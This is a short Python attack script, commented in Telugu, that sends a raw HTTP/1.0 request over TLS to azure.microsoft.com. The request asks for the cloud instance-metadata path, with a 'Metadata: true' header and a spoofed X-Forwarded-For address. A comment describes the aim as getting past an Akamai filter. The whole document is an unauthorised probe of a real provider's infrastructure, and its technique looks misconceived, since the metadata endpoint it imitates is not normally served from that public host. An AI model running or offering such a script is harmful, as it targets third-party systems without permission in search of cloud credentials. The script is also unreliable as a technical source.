import socket
import ssl

host = "azure.microsoft.com"
port = 443

# 2030 HTTP/1.0 Downgrade Attack
# పాత ప్రోటోకాల్ వాడి Akamai ఫిల్టర్ ని దాటుదాం
payload = (
    "GET /metadata/instance?api-version=2021-02-01 HTTP/1.0\r\n" # HTTP/1.0 గమనించు
    "Host: azure.microsoft.com\r\n"
    "Metadata: true\r\n"
    "X-Forwarded-For: 131.107.255.255\r\n"
    "\r\n"
)

context = ssl.create_default_context()
try:
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            print(f"🚀 Deploying HTTP/1.0 Downgrade...")
            ssock.sendall(payload.encode())
            
            res = b""
            ssock.settimeout(10)
            while True:
                try:
                    data = ssock.recv(4096)
                    if not data: break
                    res += data
                except: break
            
            print("\n📥 Response Received:")
            print(res.decode(errors='ignore'))
except Exception as e:
    print(f"❌ Error: {e}")
